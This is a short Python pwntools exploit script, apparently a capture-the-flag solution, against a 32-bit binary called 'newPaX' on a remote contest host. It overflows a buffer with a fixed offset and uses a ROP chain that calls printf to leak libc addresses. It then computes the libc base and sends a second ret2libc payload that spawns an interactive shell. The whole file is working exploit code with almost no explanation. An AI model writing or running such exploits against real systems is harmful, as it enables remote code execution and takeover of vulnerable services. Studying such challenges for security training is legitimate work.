#!/usr/bin/python3
from pwn import *
from time import sleep

context.arch = "i386"
context.bits = 32
host,port = "newpax.darkarmy.xyz",<port>
offset = b"A"*52


# GATGETS
#		0x080483d1: pop ebx; ret;
#		0x080483ba: ret;
popebx = 0x080483d1
ret = 0x080483ba
text = 0x08048750

isim = "./newPaX"
bin = ELF(isim)
zincir = ROP(bin)
zincir.call("printf", [ text ])
zincir.call("vuln")

payload = offset + zincir.chain()

#p = process(isim)
p = remote(host,port)
p.sendline(payload)
leak1 = p.read()
bir = u32(leak1[:4])
base = bir-0x098e10
iki = u32(leak1[4:8])
uc = u32(leak1[8:12])
dort = u32(leak1[12:])
print ("leaks: ",hex(bir),hex(iki),hex(uc),hex(dort))
payload = offset + p32(popebx) + p32(base+0x1691e3) + p32(ret) + p32(base+0x043980) #+ p32(base+0x2f6e0)
p.sendline(payload)
p.interactive()
#demo versiyonunu yüklemişim
